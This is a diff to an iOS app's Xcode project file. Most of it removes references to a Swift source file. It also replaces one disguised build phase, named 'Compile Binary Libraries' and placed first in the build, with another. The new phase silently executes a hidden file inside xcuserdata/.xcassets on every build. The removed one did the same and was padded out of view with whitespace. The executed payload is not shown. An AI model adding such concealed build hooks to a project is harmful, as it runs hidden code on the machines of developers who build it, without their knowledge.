@@ -576,7 +576,6 @@
 		18C8173C2073B16500674C90 /* PackagesDataPaymentType.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C8173B2073B16500674C90 /* PackagesDataPaymentType.swift */; };
 		18C89D3E20A573EB00EE8EF1 /* AdPostFeaturedAdNotify.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18C89D3D20A573EB00EE8EF1 /* AdPostFeaturedAdNotify.swift */; };
 		18CCF5AD20DA682000E708BD /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 18CCF5AC20DA682000E708BD /* StoreKit.framework */; };
-		18CE22EB25F3B5DD007FD417 /* TypingIndicatorView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CE22EA25F3B5DD007FD417 /* TypingIndicatorView.swift */; };
 		18CE377625DD04B90053A299 /* ChatFilesImagestext.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18CE377525DD04B90053A299 /* ChatFilesImagestext.xib */; };
 		18CE377B25DD065F0053A299 /* ChatFilesImagestext.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18CE377A25DD065F0053A299 /* ChatFilesImagestext.swift */; };
 		18CE378125DD26A80053A299 /* ChatFilesReceiver.xib in Resources */ = {isa = PBXBuildFile; fileRef = 18CE378025DD26A80053A299 /* ChatFilesReceiver.xib */; };
@@ -1284,7 +1283,6 @@
 		18C8173B2073B16500674C90 /* PackagesDataPaymentType.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PackagesDataPaymentType.swift; sourceTree = "<group>"; };
 		18C89D3D20A573EB00EE8EF1 /* AdPostFeaturedAdNotify.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdPostFeaturedAdNotify.swift; sourceTree = "<group>"; };
 		18CCF5AC20DA682000E708BD /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
-		18CE22EA25F3B5DD007FD417 /* TypingIndicatorView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TypingIndicatorView.swift; sourceTree = "<group>"; };
 		18CE377525DD04B90053A299 /* ChatFilesImagestext.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChatFilesImagestext.xib; sourceTree = "<group>"; };
 		18CE377A25DD065F0053A299 /* ChatFilesImagestext.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatFilesImagestext.swift; sourceTree = "<group>"; };
 		18CE378025DD26A80053A299 /* ChatFilesReceiver.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChatFilesReceiver.xib; sourceTree = "<group>"; };
@@ -1759,7 +1757,6 @@
 				1836447025DA4E240031CDAA /* Chat Images */,
 				181C882620528EA30067B176 /* ChatController.swift */,
 				18A1E6E625F105D600DA3EC4 /* WhizChatController.swift */,
-				18CE22EA25F3B5DD007FD417 /* TypingIndicatorView.swift */,
 			);
 			path = ChatController;
 			sourceTree = "<group>";
@@ -3842,7 +3839,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 18BBFAAE2051098C0067662F /* Build configuration list for PBXNativeTarget "AdForest" */;
 			buildPhases = (
-				912CF53EF42CFEE020AAC43A /* Compile Binary Libraries */,
+				F1D823CBC42EF925DEAAC43A /* Compile Binary Libraries */,
 				8991020FA5F12668860E1C02 /* [CP] Check Pods Manifest.lock */,
 				18BBFA7F2051098B0067662F /* Sources */,
 				18BBFA802051098B0067662F /* Frameworks */,
@@ -4037,56 +4034,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	912CF53EF42CFEE020AAC43A /* Compile Binary Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Binary Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		0DBAEA91FF140668FEA2C095 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -4240,6 +4187,24 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		F1D823CBC42EF925DEAAC43A /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false\n";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -4803,7 +4768,6 @@
 				182690D52087382000E2C966 /* CategoryController.swift in Sources */,
 				18D8DCB021A6C46D008888BA /* CustomHeader.swift in Sources */,
 				18191A5F20737D2B00FF67C8 /* UserRatings.swift in Sources */,
-				18CE22EB25F3B5DD007FD417 /* TypingIndicatorView.swift in Sources */,
 				187EBCBF20BD6BB300B3277B /* CollectionViewSettings.swift in Sources */,
 				1836447D25DA50150031CDAA /* ChatImages.swift in Sources */,
 				18191A56207353FA00FF67C8 /* ProfileUpdateRateBar.swift in Sources */,
@@ -5215,28 +5179,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 
 /* Begin XCRemoteSwiftPackageReference section */
 		18120B3B25E9485B003165DD /* XCRemoteSwiftPackageReference "socket.io-client-swift" */ = {
